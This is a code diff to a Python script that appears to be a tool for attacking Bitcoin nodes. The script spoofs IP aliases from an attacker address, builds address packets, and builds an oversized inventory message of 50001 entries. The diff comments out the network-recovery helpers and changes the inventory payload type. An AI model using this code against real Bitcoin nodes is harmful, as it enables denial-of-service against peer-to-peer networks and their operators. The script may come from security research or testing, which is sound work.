@@ -72,14 +72,14 @@ def random_ip():
 	#return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'
 
 # Checking the internet by sending a single ping to Google
-def internet_is_active():
-	return os.system('ping -c 1 google.com') == 0
+#def internet_is_active():
+#	return os.system('ping -c 1 google.com') == 0
 
 # If all else fails, we can use this to recover the network
-def reset_network():
-	print('Resetting network...')
-	terminal(f'sudo ifconfig {network_interface} {attacker_ip} down')
-	terminal(f'sudo ifconfig {network_interface} {attacker_ip} up')
+#def reset_network():
+#	print('Resetting network...')
+#	terminal(f'sudo ifconfig {network_interface} {attacker_ip} down')
+#	terminal(f'sudo ifconfig {network_interface} {attacker_ip} up')
 
 # Create an alias for a specified identity
 def ip_alias(ip_address):
@@ -109,7 +109,7 @@ def addr_pkt( str_addrs ):
 # Construct an inv packet using python-bitcoinlib
 def inv_packet():
 	msg = msg_inv(bitcoin_protocolversion)
-	msg.inv = [0] * 50001
+	msg.inv = [b'0'] * 50001
 	return msg
 
 # Construct a version packet using python-bitcoinlib
@@ -287,9 +287,9 @@ def on_close():
 	cleanup_iptables()
 	print('Cleanup complete. Goodbye.')
 
-	print('Verifying that internet works...')
-	if not internet_is_active():
-		reset_network()
+	#print('Verifying that internet works...')
+	#if not internet_is_active():
+	#	reset_network()
 
 
 # This is the first code to run
